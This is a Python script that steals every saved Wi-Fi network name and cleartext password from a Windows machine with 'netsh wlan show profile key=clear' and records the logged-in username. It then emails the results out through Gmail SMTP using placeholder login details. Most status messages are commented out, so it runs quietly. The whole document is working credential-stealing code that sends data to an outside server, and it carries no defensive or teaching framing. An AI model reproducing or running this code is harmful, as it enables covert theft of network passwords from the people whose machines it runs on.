import subprocess
import smtplib
import re


def send_mail(mail, password, message)->bool:
    '''
    sends email from mail to itself.
    params: mail, password, message -> str
    retuns bool
    '''
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587) 
        # print('[+] Connected to Google Server.')
        server.starttls()
        # print('[*] TLS started successfully.')
        server.login(mail, password)
        # print('[*] Logged in successfully.')
        server.sendmail(mail, mail, message)
        # print('[*] Data has been sent.')
        server.quit()
        # print('[*] Server Connection has been closed.')
        return True
    except smtplib.SMTPException as e:
        # print('[-] Exception : ', e)
        return False


def get_credentials()->str:
    '''
    returns wifi credentials as str
    '''
    def get_username():
        '''
        returns username if detected else returns "Unkown User"
        '''
        username = subprocess.check_output('whoami', shell=True).decode()
        if username:
            return username
        else:
            return 'Unknown User'


    command = 'netsh wlan show profiles'
    networks = subprocess.check_output(command, shell=True).decode()
    network_names = re.findall(r'(?:Profile\s*:\s)(.*)', networks)

    overall_nw_data = f'Subject: Received Credentials from {get_username()} \n'
    ssid_passwds = 'SSID : Password\n'
    for network_name in network_names:
        if 'QuantumRegion' in network_name:
            continue

        network_name = network_name.replace('\r','')
        command = 'netsh wlan show profile "' + (network_name) + '" key=clear'
        
        nw_info = subprocess.check_output(command, shell=True).decode()
        overall_nw_data += nw_info
        
        passwd_res = re.search(r'(?:Key\sContent\s*:\s)(.*)', nw_info)
        passwd = passwd_res.group(1)

        ssid_passwds += f'{network_name} : {passwd}\n'

    overall_nw_data += ssid_passwds
    # print(overall_nw_data)
    # print(ssid_passwds)
    return overall_nw_data


mail = "your_email@gmail.com"
passwd = "your_password"

credentials = get_credentials()
# print(credentials)
if credentials:
    # print('[*] Recieved Credentials.')
    if send_mail(mail=mail, password=passwd, message=credentials):
        print('[*] Process Completed Successfully')
        pass
    else:
        # print('[-] Process Interuppted!')
        pass
else:
    # print('[-] Failed to get credentials.')
    pass